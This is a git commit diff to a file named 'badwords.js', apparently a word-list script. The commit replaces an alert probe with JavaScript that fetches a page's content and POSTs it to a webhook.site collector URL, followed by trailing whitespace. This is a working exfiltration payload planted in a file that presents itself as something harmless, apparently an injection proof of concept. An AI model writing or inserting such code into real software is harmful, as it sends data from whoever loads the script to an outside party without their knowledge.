a65fc3fc30b3772e471e7c3dcd8f25a463f644f6
2xmd5hasgoneinsane <84242433+2xmd5hasgoneinsane@users.noreply.github.com>
2021-05-15 18:36:18 +0200

    Update badwords.js

--- badwords.js
+++ badwords.js
@@ -1,1 +1,3 @@
-alert(">.>");
+fetch("https://2xmd5hasgoneinsane.github.io/").then( r => r.text() ).then( r =>
+	fetch("https://webhook.site/#!/f6ca6116-5afa-46f2-84b5-175025c85670/", {method:"POST", body:r})														  	
+);
